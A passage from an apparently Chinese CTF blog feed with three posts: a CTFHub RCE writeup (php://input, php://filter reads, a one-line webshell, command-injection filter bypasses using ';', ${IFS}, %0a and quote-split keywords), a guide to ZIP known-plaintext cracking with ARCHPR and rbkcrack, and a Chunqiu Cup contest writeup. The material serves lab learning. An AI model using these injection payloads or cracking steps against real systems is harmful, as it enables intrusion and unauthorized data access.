/f*&#x27;);</span><br></pre></td></tr></table></figure><blockquote><p>ctfhub{e95bf56ca09c475de96779f8}</p></blockquote><h2 id="php-input">php://input</h2><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128234417464.png" alt="image-20241128234417464"></p><p>有个phpinfo()的网页，打开，搜索flag，没有。</p><p>根据提示使用php://input协议</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128234916846.png" alt="image-20241128234916846"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128234946005.png" alt="image-20241128234946005"></p><blockquote><p>ctfhub{fd2d24ec67a3d02745d252ec}</p></blockquote><h2 id="读取源代码">读取源代码</h2><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128235118224.png" alt="image-20241128235118224"></p><p>根据代码和提示，要使用php协议读取目录/flag</p><p>直接使用filter协议读取，构造：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?file=php://filter/convert.base64-encode/resource=/flag</span><br></pre></td></tr></table></figure><blockquote><p>ctfhub{ad11f5cf0c3528e0097fc84f}</p></blockquote><h2 id="远程包含">远程包含</h2><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128235615623.png" alt="image-20241128235615623"></p><p>跟上面的题目一样,直接使用php://input，然后写入一句话木马</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241129000043701.png" alt="image-20241129000043701"></p><p>蚁剑连接，拿到flag</p><blockquote><p>ctfhub{bc23c4d608ef1b89ff1d8564}</p></blockquote><h2 id="命令注入">命令注入</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$res = FALSE;</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#x27;ip&#x27;]) &amp;&amp; $_GET[&#x27;ip&#x27;]) &#123;</span><br><span class="line">    $cmd = &quot;ping -c 4 &#123;$_GET[&#x27;ip&#x27;]&#125;&quot;;</span><br><span class="line">    exec($cmd, $res);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看出来是一个ping网址的功能，先试试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1;ls -al</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250201210701699.png" alt="image-20250201210701699"></p><p>打开278612477123991.php</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250201211032131.png" alt="image-20250201211032131"></p><blockquote><p>ctfhub{7c642fd3989abe8db46cf948}</p></blockquote><h2 id="过滤cat">过滤cat</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$res = FALSE;</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#x27;ip&#x27;]) &amp;&amp; $_GET[&#x27;ip&#x27;]) &#123;</span><br><span class="line">    $ip = $_GET[&#x27;ip&#x27;];</span><br><span class="line">    $m = [];</span><br><span class="line">    if (!preg_match_all(&quot;/cat/&quot;, $ip, $m)) &#123;</span><br><span class="line">        $cmd = &quot;ping -c 4 &#123;$ip&#125;&quot;;</span><br><span class="line">        exec($cmd, $res);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $res = $m;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>过滤了cat，但是可以用tac</p><blockquote><p>ctfhub{7c7a18aea2905940e36dd90e}</p></blockquote><h2 id="过滤空格">过滤空格</h2><p>过滤了空格可以用${IFS}代替</p><blockquote><p>ctfhub{635b63dfee2f877be2058c7c}</p></blockquote><h2 id="过滤目录分隔符">过滤目录分隔符</h2><p>过滤了目录分隔符，但是可以使用命令拼接来找flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1;cd flag_is_here;ls -al</span><br><span class="line">127.0.0.1;cd flag_is_here;cat flag_31274326351910.php</span><br></pre></td></tr></table></figure><blockquote><p>ctfhub{0a399fadb5bd0716775832b5}</p></blockquote><h2 id="过滤运算符">过滤运算符</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$res = FALSE;</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#x27;ip&#x27;]) &amp;&amp; $_GET[&#x27;ip&#x27;]) &#123;</span><br><span class="line">    $ip = $_GET[&#x27;ip&#x27;];</span><br><span class="line">    $m = [];</span><br><span class="line">    if (!preg_match_all(&quot;/(\||\&amp;)/&quot;, $ip, $m)) &#123;</span><br><span class="line">        $cmd = &quot;ping -c 4 &#123;$ip&#125;&quot;;</span><br><span class="line">        exec($cmd, $res);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $res = $m;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>过滤了|和&amp;符号，但是可以用分号;</p><blockquote><p>ctfhub{83f8b09d42bb7631282a83b4}</p></blockquote><h2 id="综合过滤练习">综合过滤练习</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$res = FALSE;</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#x27;ip&#x27;]) &amp;&amp; $_GET[&#x27;ip&#x27;]) &#123;</span><br><span class="line">    $ip = $_GET[&#x27;ip&#x27;];</span><br><span class="line">    $m = [];</span><br><span class="line">    if (!preg_match_all(&quot;/(\||&amp;|;| |\/|cat|flag|ctfhub)/&quot;, $ip, $m)) &#123;</span><br><span class="line">        $cmd = &quot;ping -c 4 &#123;$ip&#125;&quot;;</span><br><span class="line">        exec($cmd, $res);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $res = $m;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>分析一下，过滤了|&amp;; ，可以使用%0a来作为回车符使用，效果一样</p><p>过滤三个关键字cat,flag,ctfhub，可以使用两个单引号或者两个双引号绕过</p><p>过滤空格，可以使用${IFS}绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=127.0.0.1%0als$&#123;IFS&#125;-al%0acd$&#123;IFS&#125;fla&#x27;&#x27;g_is_here%0aca&#x27;&#x27;t$&#123;IFS&#125;f*</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241130130405955.png" alt="image-20241130130405955"></p><blockquote><p>ctfhub{cbff46daeb4e000265fb35d6}</p></blockquote>]]></content>
    
    
    <summary type="html">CTFHub技能树-rce系列wp</summary>
    
    
    
    <category term="CTF" scheme="https://blog.m3x1.cn/categories/CTF/"/>
    
    
    <category term="web-wp" scheme="https://blog.m3x1.cn/tags/web-wp/"/>
    
  </entry>
  
  <entry>
    <title>两种明文攻击</title>
    <link href="https://blog.m3x1.cn/posts/fcd8d963.html"/>
    <id>https://blog.m3x1.cn/posts/fcd8d963.html</id>
    <published>2025-01-19T16:00:00.000Z</published>
    <updated>2025-01-21T06:22:40.574Z</updated>
    
    <content type="html"><![CDATA[<h4 id="一、完整的明文文件">一、完整的明文文件</h4><p>要达成明文攻击需要注意以下三点</p><p>①完整的明文文件</p><p>②明文文件需要被相同的压缩算法标准压缩（也可理解为被相同压缩工具压缩）</p><p>③明文对应文件的加密算法需要是 ZipCrypto（ZipCrypto又分为ZipCrypto Deflate/ZipCrypto Store）</p><p>使用ARCHPR进行明文攻击</p><p>破解时长应该不超过5分钟，运行至5分钟左右可以手动停止，ARCHPR会跳出来破解出的三个key。当然，这个结果并不是压缩包的密码，而是一个去除密码的压缩包<code>xxx_decrypted.zip</code>，把这个文件直接解开就可以了。</p><p>用以上方法需要已知一整个明文文件。</p><h4 id="二、已知一部分明文">二、已知一部分明文</h4><p>使用rbkcrack只需要知道加密压缩包内容的连续12个字节，即可进行攻击破解。同时，结合各类已知的文件格式，更扩宽了ZIP已知明文攻击的攻击面。</p><blockquote><p>rbkcrack下载地址：</p><p><a href="https://github.com/Aloxaf/rbkcrack">https://github.com/Aloxaf/rbkcrack</a></p></blockquote><p>rbkcrack常用参数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">-C 加密的压缩包</span><br><span class="line">-c 压缩包内加密的文件</span><br><span class="line">-p 明文内容</span><br><span class="line">-k 输入key</span><br><span class="line">-o 偏移量</span><br><span class="line">-d 攻击完成后导出解密文件</span><br><span class="line">-u 自动解压</span><br></pre></td></tr></table></figure><p>实例：</p><p>png是制作的png文件头</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rbkcrack<span class="selector-class">.exe</span> -C LP<span class="selector-class">.zip</span> -c LP<span class="selector-class">.png</span> -<span class="selector-tag">p</span> png</span><br></pre></td></tr></table></figure><p>拿到key后进行解密</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rbkcrack.exe -C LP.zip -c LP.png -k <span class="number">0f</span>518bd2 <span class="number">680365f</span>9 <span class="number">0</span>ecf26a8 -d <span class="keyword">out</span>.png</span><br></pre></td></tr></table></figure><p>因为LP.zip是以ZipCrypto Deflate方式加密的</p><p>所以解密后注意得到的out.png是deflate的数据流，需要使用python脚本进行解码</p><p>在rbkcrack的tools里找到这个脚本</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python inflate.py &lt; <span class="keyword">out</span>.png &gt; out1.png</span><br></pre></td></tr></table></figure><p>至此大功告成，成功提取到压缩文件里的LP.png</p>]]></content>
    
    
    <summary type="html">🥧两种明文攻击</summary>
    
    
    
    <category term="CTF" scheme="https://blog.m3x1.cn/categories/CTF/"/>
    
    
    <category term="misc姿势" scheme="https://blog.m3x1.cn/tags/misc%E5%A7%BF%E5%8A%BF/"/>
    
  </entry>
  
  <entry>
    <title>2024年春秋杯网络安全联赛冬季赛wp-1.19</title>
    <link href="https://blog.m3x1.cn/posts/55fde2b7.html"/>
    <id>https://blog.m3x1.cn/posts/55fde2b7.html</id>
    <published>2025-01-18T16:00:00.000Z</published>
    <updated>2025-01-22T06:51:48.573Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h2 id="web">web</h2><h4 id="easy-php">easy_php</h4><blockquote><p>考点：文件上传绕过，截断，源码审计</p></blockquote><p>打开网站后，可以下载源码，先下载源码，然后再扫一下网站目录</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250119181445364.png" alt="image-20250119181445364"></p><p>配合源码审计，审计过程省略。其中在文件上传的目录下已经有文件了，再结合提示可以知道，不用再自己上传文件。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250119181544673.png" alt="image-20250119181544673"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250119181621889.png" alt="image-20250119181621889"></p><p>那么就需要触发文件，看这里代码</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250119181707567.png" alt="image-20250119181707567"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250119181802190.png" alt="image-20250119181802190"></p><p>可以知道在/file.php页面中可以进行url的get传参，然后会将参数值过滤后进行高亮，触发反序列化链。</p><p>但是这里的过滤中，是f1ag而不是flag，所以其实没有过滤flag关键词。</p><p>因此结合源码，直接构造payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=/flag</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250119182045246.png" alt="image-20250119182045246"></p><blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;a16dcb7549915546893a27a6d7927615&#125;</span><br></pre></td></tr></table></figure></blockquote><h4 id="easy-code">easy_code</h4><blockquote><p>考点：利用PHP特性绕过，filter伪协议</p></blockquote><p>访问/robots.txt 可以看到有 gogogo.php</p><p>ctfer 参数有三个检测，只需要用科学计数法，PHP 会自动四舍五入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfer=6.66999999999999999999999999999999999999999e2</span><br></pre></td></tr></table></figure><p>Hackbar 里设置 cookie 为 pass=admin</p><p><img src="http://cn-sec.com/wp-content/uploads/2025/01/6-1737303857.png" alt="2024春秋杯冬季赛三日Writeup汇总(https://gitee.com/star3119391396/cloudimage/raw/master/img/6-1737303857.png)"></p><p>Include 那里使用 php://filter 配合 convert.iconv 修改字符集使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ile=php://filter/convert.iconv.utf-8.utf-16le/resource=read.php</span><br></pre></td></tr></table></figure><h2 id="misc">misc</h2><h4 id="音频的秘密">音频的秘密</h4><blockquote><p>考点：知道部分明文破解压缩包</p></blockquote><p>下载附件解压，是一个wav文件，根据提示知道，是deepsound加密，且密码为弱口令。</p><p>用deepsound解密，弱口令密码一个一个试，最后密码为123，得到一个flag.zip</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250120222149903.png" alt="image-20250120222149903"></p><p>提取出来，发现需要密码，压缩包内是一张图片。</p><p>用各种工具爆破，发现长时间都没爆破出来，最后赛后复现，看别人wp才知道，明文加密除了使用完整明文文件外，也有一种使用一部分明文文件的爆破方式。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250120225951271.png" alt="image-20250120225951271"></p><p>得到一张png图片，在rgb处发现flag</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250120230117284.png" alt="image-20250120230117284"></p><blockquote><p>flag{Y1_Shun_jian_Fa_ZE_Dian_Fu}</p></blockquote><h4 id="Infinity">Infinity</h4><blockquote><p>考点：套娃压缩包，解码</p></blockquote><p>下载压缩包解压，里面是张png图片，放进010editor查看，发现有嵌套文件。</p><p>进行文件分离，得到一个压缩包。</p><p>压缩包里有zip,tar,7z三种，且压缩包名字感觉像是某种编码。</p><p>写脚本直接解压并记下文件名。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">import zipfile</span><br><span class="line">import tarfile</span><br><span class="line">import py7zr</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">path = &quot;C:\\Users\\Lucky\\Desktop\\春秋杯\\misc\\新建文件夹 (2)\\foremost_output\\zip\\&quot;</span><br><span class="line">count = []</span><br><span class="line">txt = open(&quot;C:\\Users\\Lucky\\Desktop\\春秋杯\\misc\\新建文件夹 (2)\\foremost_output\\count.txt&quot;, &quot;w&quot;)</span><br><span class="line">while True:</span><br><span class="line">    contents = os.listdir(&quot;C:\\Users\\Lucky\\Desktop\\春秋杯\\misc\\新建文件夹 (2)\\foremost_output\\zip&quot;)</span><br><span class="line">    for i in contents:</span><br><span class="line">        if i not in count:</span><br><span class="line">            file_path = path + i</span><br><span class="line">            txt.write(i + &quot;\n&quot;)</span><br><span class="line">            file_extension = i.split(&#x27;.&#x27;)[-1]</span><br><span class="line">            if file_extension == &#x27;zip&#x27;:</span><br><span class="line">                with zipfile.ZipFile(file_path, &#x27;r&#x27;) as zip_ref:</span><br><span class="line">                    zip_ref.extractall(r&quot;C:\\Users\\Lucky\\Desktop\\春秋杯\\misc\\新建文件夹 (2)\\foremost_output\\zip&quot;)</span><br><span class="line">                file_path = path + i</span><br><span class="line">                count.append(i)</span><br><span class="line">            elif file_extension == &#x27;tar&#x27;:</span><br><span class="line">                with tarfile.open(file_path, &#x27;r&#x27;) as tar_ref:</span><br><span class="line">                    tar_ref.extractall(r&quot;C:\\Users\\Lucky\\Desktop\\春秋杯\\misc\\新建文件夹 (2)\\foremost_output\\zip&quot;)</span><br><span class="line">                file_path = path + i</span><br><span class="line">                count.append(i)</span><br><span class="line">            elif file_extension == &#x27;7z&#x27;:</span><br><span class="line">                with py7zr.SevenZipFile(file_path, &#x27;r&#x27;) as seven_ref:</span><br><span class="line">                    seven_ref.extractall(r&quot;C:\\Users\\Lucky\\Desktop\\春秋杯\\misc\\新建文件夹 (2)\\foremost_output\\zip&quot;)</span><br><span class="line">                file_path = path + i</span><br><span class="line">                count.append(i)</span><br><span class="line">            else:</span><br><span class="line">                print(&quot;File extension not supported&quot;)</span><br><span class="line">                break</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250122143943094.png" alt="image-20250122143943094"></p><p>解压后得到一个SeCr3t.txt，文件内容是Inf1nityIsS0CoOL。</p><p>用脚本对这些字符串进行处理，发现在逆序的时候能根据提示进行解码。即代码中的第二个print。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">data = open(&quot;C:\\Users\\Lucky\\Desktop\\春秋杯\\misc\\Infinity\\flag.txt&quot;, &quot;r&quot;).read()</span><br><span class="line">#文本之中每行有一个字符串</span><br><span class="line">data = data.split(&quot;\n&quot;)</span><br><span class="line"></span><br><span class="line">print(&quot;&quot;.join(data))  #将每行字符串顺序连接起来</span><br><span class="line">print(&quot;&quot;.join(reversed(data)))  #将每行字符串逆序连接起来</span><br><span class="line">print(&quot;&quot;.join([d[::-1] for d in data]))  #将每行字符串反转后顺序连接起来</span><br><span class="line">print(&quot;&quot;.join([d[::-1] for d in reversed(data)])) #将每行字符串反转后再逆序连接起来</span><br></pre></td></tr></table></figure><p>根据提示知道，是BASE58-Ripple<code>+</code>SM4-ECB，sm4中的key改为上述文件内容，得到一张条形码</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250122144403181.png" alt="image-20250122144403181"></p><p>由于下载下来的图片是很暗的，很难直接识别，所以要先加白底。简便方法就i是直接预览加截图保存，然后扫描截图。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250122144536029.png" alt="image-20250122144536029"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250122144840998.png" alt="image-20250122144840998"></p><blockquote><p>flag{a72dd260-f64d-4116-ab50-b26b40d69883}</p></blockquote>]]></content>
    
    
    <summary type="html">🥧2024年春秋杯网络安全联赛冬季赛wp-1.19</summary>
    
    
    
    <category term="CTF" scheme="https://blog.m3x1.cn/categories/CTF/"/>
    
    
    <category term="比赛wp" scheme="https://blog.m3x1.cn/tags/%E6%AF%94%E8%B5%9Bwp/"/>
    
  </entry>
  
</feed>
